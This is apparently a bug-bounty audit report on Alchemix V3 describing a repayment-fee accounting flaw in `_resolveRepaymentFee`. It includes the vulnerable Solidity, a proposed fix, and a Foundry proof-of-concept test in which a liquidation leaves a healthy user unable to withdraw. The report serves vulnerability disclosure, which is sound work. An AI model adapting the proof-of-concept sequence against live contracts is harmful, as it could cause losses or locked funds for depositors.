# 58288 sc critical incorrect fee payment logic leads to underpayment&#x20;

**Submitted on Nov 1st 2025 at 00:35:05 UTC by @Petrus for** [**Audit Comp | Alchemix V3**](https://immunefi.com/audit-competition/alchemix-v3-audit-competition)

* **Report ID:** #58288
* **Report Type:** Smart Contract
* **Report severity:** Critical
* **Target:** <https://github.com/alchemix-finance/v3-poc/blob/immunefi\\_audit/src/AlchemistV3.sol>
* **Impacts:**
  * Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description

## Brief/Intro

The \_resolveRepaymentFee () in AlchemistV3 computes the full repayment fee but only deducts the capped amount from the account's collateral balance while returning, emitting, and enabling transfer of the uncapped full fee, causing per-account accounting overstatements and potential over-withdrawals.

## Vulnerability Details

```solidity
function _resolveRepaymentFee(uint256 accountId, uint256 repaidAmountInYield) internal returns (uint256 fee) { 

    Account storage account = _accounts[accountId]; 

    // calculate repayment fee and deduct from account 

    fee = repaidAmountInYield * repaymentFee / BPS; 

@>    account.collateralBalance -= fee > account.collateralBalance ? account.collateralBalance : fee; // Caps subtraction 

 

    emit RepaymentFee(accountId, repaidAmountInYield, msg.sender, fee); // Full fee 

    return fee; // Full fee transferred in caller 

} 
```

The function calculates the full fee based on repaidAmountInYield but deducts only the minimum of fee and account.collateralBalance from the per-account collateralBalance, then emits and returns the uncapped fee for transfer in the caller, allowing the full amount to be transferred from the contract's total balance without fully deducting from the account's tracked balance.

## Soln

To fix the mismatched accounting issue in \_resolveRepaymentFee by ensuring the returned, emitted, and transferred fee matches the actual amount deducted from the account's collateral balance (capping it to available funds), compute and use an actualFee variable consistently to prevent over-transfers and per-account balance overstatements.

```solidity
/// @dev Handles repayment fee calculation and account deduction 

/// @param accountId The tokenId of the account to force a repayment on. 

/// @param repaidAmountInYield The amount of debt repaid in yield tokens. 

/// @return fee The fee in yield tokens to be sent to the liquidator. 

function _resolveRepaymentFee(uint256 accountId, uint256 repaidAmountInYield) internal returns (uint256 fee) { 

    Account storage account = _accounts[accountId]; 

    // calculate repayment fee and deduct from account 

    fee = repaidAmountInYield * repaymentFee / BPS; 

    uint256 actualFee = fee > account.collateralBalance ? account.collateralBalance : fee; 

    account.collateralBalance -= actualFee; 

    emit RepaymentFee(accountId, repaidAmountInYield, msg.sender, actualFee); 

    return actualFee; 

} 
```

## Impact Details

Per-account collateral accounting becomes overstated relative to actual outflows, enabling over-withdrawals from the liquidated account and diverging summed account balances from the global token holdings.

## References

<https://github.com/alchemix-finance/v3-poc/blob/a192ab313c81ba3ab621d9ca1ee000110fbdd1e9/src/AlchemistV3.sol#L900>

## Proof of Concept

## Proof of Concept/

Run the test in AlchemistV3.t.sol

Run the test with: forge test --match-test testResolveRepaymentFeeOverstatesAccountCollateralEnablingDilutionAndWithdrawalFailures -vvvv

```soldity
function testResolveRepaymentFeeOverstatesAccountCollateralEnablingDilutionAndWithdrawalFailures() external { 

    // Setup: Configure repayment fee to 1% (non-zero to trigger fee transfer) 

    uint256 repaymentFeeBPS = 100; // 1% 

    vm.prank(alOwner); 

    alchemist.setRepaymentFee(repaymentFeeBPS); 

 

    // Setup healthy account: deposit to maintain global collateralization 

    uint256 healthyTestDeposit = 200e18; 

    vm.startPrank(yetAnotherExternalUser); 

    SafeERC20.safeApprove(address(vault), address(alchemist), healthyTestDeposit); 

    alchemist.deposit(healthyTestDeposit, yetAnotherExternalUser, 0); 

    uint256 healthyTokenId = AlchemistNFTHelper.getFirstTokenId(yetAnotherExternalUser, address(alchemistNFT)); 

    vm.stopPrank(); 

 

    // Setup liquidated account: deposit and mint max debt 

    uint256 liquidatedTestDeposit = 100e18; 

    address liquidatedUser = address(0xbeef); 

    vm.startPrank(liquidatedUser); 

    SafeERC20.safeApprove(address(vault), address(alchemist), liquidatedTestDeposit); 

    alchemist.deposit(liquidatedTestDeposit, liquidatedUser, 0); 

    uint256 liquidatedTokenId = AlchemistNFTHelper.getFirstTokenId(liquidatedUser, address(alchemistNFT)); 

    uint256 maxDebt = alchemist.getMaxBorrowable(liquidatedTokenId); 

    alchemist.mint(liquidatedTokenId, maxDebt, liquidatedUser); 

    vm.stopPrank(); 

 

    // Pre-state: Record contract shares and account collaterals 

    uint256 preContractShares = vault.balanceOf(address(alchemist)); 

    (uint256 healthyCollateralPre, , ) = alchemist.getCDP(healthyTokenId); 

    (uint256 liquidatedCollateralPre, , ) = alchemist.getCDP(liquidatedTokenId); 

    assertEq(preContractShares, healthyTestDeposit + liquidatedTestDeposit); 

 

    // Transfer synthetics for redemption creation 

    vm.prank(liquidatedUser); 

    IERC20(alToken).transfer(anotherExternalUser, maxDebt); 

 

    // Create full redemption to enable full earmark 

    vm.startPrank(anotherExternalUser); 

    SafeERC20.safeApprove(address(alToken), address(transmuterLogic), maxDebt); 

    transmuterLogic.createRedemption(maxDebt); 

    vm.stopPrank(); 

 

    // Advance full transmutation period 

    vm.roll(block.number + transmuterLogic.timeToTransmute()); 

 

    // Trigger full earmark via poke (queries full period) 

    vm.prank(liquidatedUser); 

    alchemist.poke(liquidatedTokenId); 

 

    // Confirm full earmark before price drop 

    (, , uint256 earmarked) = alchemist.getCDP(liquidatedTokenId); 

    assertApproxEqAbs(earmarked, maxDebt, 1e15); // Allow minor rounding 

 

    // Drop yield price ~20% (increase yield supply 25%) to undercollateralize while keeping shares fixed 

    uint256 initialYieldSupply = IERC20(mockStrategyYieldToken).totalSupply(); 

    uint256 increasedYieldSupply = (initialYieldSupply * 125) / 100; 

    MockYieldToken(mockStrategyYieldToken).updateMockTokenSupply(increasedYieldSupply); 

 

    // Verify undercollateralized (triggers liquidation via repayment path) 

    uint256 postDropCollateralValue = alchemist.totalValue(liquidatedTokenId); 

    uint256 postDropRatio = (postDropCollateralValue * 1e18) / maxDebt; 

    assertLt(postDropRatio, alchemist.collateralizationLowerBound()); 

 

    // Liquidate: Triggers forceRepay full earmarked (== debt), caps creditToYield to liquidatedTestDeposit shares 

    // Post-forceRepay: collateralBalance = 0, debt = 0, enters repayment path 

    // _resolveRepaymentFee: fee calculated full on capped creditToYield, deducts min(fee, 0)=0, but transfers full fee 

    uint256 preLiquidationContractShares = vault.balanceOf(address(alchemist)); 

    vm.startPrank(externalUser); 

    (uint256 liqYield, uint256 liqFeeYield, uint256 liqFeeUnderlying) = alchemist.liquidate(liquidatedTokenId); 

    vm.stopPrank(); 

 

    // Post-liquidation: Contract shares reduced by liquidatedTestDeposit (to transmuter) + fee (to liquidator) 

    uint256 feeShares = (liquidatedTestDeposit * repaymentFeeBPS) / BPS; 

    uint256 expectedPostContractShares = preLiquidationContractShares - liquidatedTestDeposit - feeShares; 

    uint256 actualPostContractShares = vault.balanceOf(address(alchemist)); 

    assertEq(actualPostContractShares, expectedPostContractShares); 

 

    // Post-liquidation accounts: liquidated collateralBalance = 0 (capped deduction), healthy unchanged 

    (uint256 healthyCollateralPost, , ) = alchemist.getCDP(healthyTokenId); 

    (uint256 liquidatedCollateralPost, , ) = alchemist.getCDP(liquidatedTokenId); 

    assertEq(healthyCollateralPost, healthyCollateralPre); 

    assertEq(liquidatedCollateralPost, 0); 

 

    // Divergence: Sum of account collaterals > contract shares (extra fee not deducted from any account) 

    uint256 sumAccountCollaterals = healthyCollateralPost + liquidatedCollateralPost; 

    assertGt(sumAccountCollaterals, actualPostContractShares); // Overstatement by feeShares 

 

    // Impact: Healthy user attempts full withdrawal, reverts due to insufficient contract shares 

    vm.startPrank(yetAnotherExternalUser); 

    vm.expectRevert(); // Transfer fails: contract balance < requested healthyTestDeposit 

    alchemist.withdraw(healthyCollateralPost, yetAnotherExternalUser, healthyTokenId); 

    vm.stopPrank(); 

} 

```
